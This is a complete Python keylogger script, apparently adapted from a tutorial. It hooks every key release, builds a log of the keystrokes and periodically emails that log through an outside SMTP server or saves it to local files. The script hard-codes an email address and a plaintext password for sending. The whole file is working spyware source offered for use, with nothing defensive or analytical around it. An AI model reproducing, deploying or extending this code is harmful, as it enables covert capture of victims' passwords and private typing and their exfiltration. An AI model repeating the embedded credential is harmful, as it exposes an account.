# ================================================================================
# FILE NAME:  keylogger.py
#
# PURPOSE:
# Keylogger
# CREATED DATE: 2021-09-19
# AUTHOR:       @hedgenull, Abdul Rockikiz (thepythoncode.com)
# ================================================================================

import keyboard
import smtplib
from threading import Timer
from datetime import datetime

# Constants
SEND_REPORTS_EVERY = 120
EMAIL_ADDRESS = "mathopotamus@bearcreek.family"
EMAIL_PASSWORD = "hippoLover77"

class Keylogger:
    def __init__(self, interval:int, report_method:str="email"):
        """
        Keylogger class that reports log files every 'interval' seconds.
        Report methods:
        'email' : Emails to provided account. (Default setting)
        'file' : Writes logs to local files.
        """
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event occurs
        (when a key is released).
        """
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
    
    def update_filename(self):
        """
        Update filename, for reporting to local files.
        """
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
    
    def report_to_file(self):
        """
        This method creates a log file in the current directory that 
        contains the current keylogs in the 'self.log' variable.
        """
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Successfully saved {self.filename}.txt.")
    
    def sendmail(self, email:str, password:str, message:str):
        """
        Connect to the SMTP server and send keylogs to specified address.
        """
        server = smtplib.SMTP(host = "smtp.bearcreek.family", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
    
    def report(self):
        """
        This function gets called every 'self.interval' seconds.
        It basically sends keylogs and resets 'self.log' variable.
        """
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()
    
    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORTS_EVERY, report_method="file")
    keylogger.start()